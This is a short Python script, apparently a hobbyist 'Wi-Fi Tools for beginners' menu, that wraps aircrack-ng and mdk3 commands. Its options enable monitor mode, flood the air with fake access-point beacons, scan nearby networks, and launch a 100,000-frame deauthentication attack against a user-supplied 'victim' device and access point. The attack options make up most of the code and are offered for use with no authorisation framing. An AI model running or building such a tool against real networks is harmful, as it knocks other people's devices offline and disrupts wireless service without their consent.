
from rich.console import Console
from rich.text import Text
import pyfiglet
import subprocess
import re 

console = Console()

testo = "Wi-Fi Tools for beginners"
ascii_art = pyfiglet.figlet_format(testo)

def color_arcobaleno(text):
    colori = ["red", "yellow", "green", "cyan", "blue", "magenta"]
    colored_text = Text()
    for i, char in enumerate(text):
        colored_text.append(char, style=colori[i % len(colori)])
    return colored_text

console.print(color_arcobaleno(ascii_art))

# Mostra le opzioni su righe separate
console.print("Opzioni:")
console.print("0 Monitor mode")
console.print("1. Create random access point")
console.print("2. Scan Wi-Fi")
console.print("3. Deauthentication ATTACK")
console.print("4. Exit")

opzione = int(input())
if opzione == 0:
    interface = input("Write your interface: ")
    
    # Esegui airmon-ng check kill
    subprocess.run(["airmon-ng", "check", "kill"])

    # Esegui airmon-ng start
    comando1 = ["airmon-ng", "start", interface]
    subprocess.run(comando1)

if opzione == 1:
    interface = str(input("Write your interface (first turn on monitor mode): "))
    comandd = ["mdk3", interface, "b"]
    subprocess.run(comandd)
    print("Go in your phone and check all the fake wifi crated, ENJOY")
if opzione == 2:
    interface = input("Write your interface (first turn on monitor mode): ")
    comando = ["airodump-ng", interface]
    subprocess.run(comando)
if opzione == 3:
    print("Specify mac address of the victim(station) and mac address from the wifi(bssid),\n to find this go to the scan wifi")
    print("if the program says (but the ap is on channel ...) run the comand \n iwconfig your_interface channel ---")
    input1 = str(input("Wi-Fi Bssid: "))
    input2 = str(input("Victim MAC: "))
    interface = input("Write your interface (first turn on monitor mode): ")
    command = ["aireplay-ng", "--deauth", "100000", "-a", input1, "-c", input2, interface]
    subprocess.run(command)
if opzione == 4:
    exit()
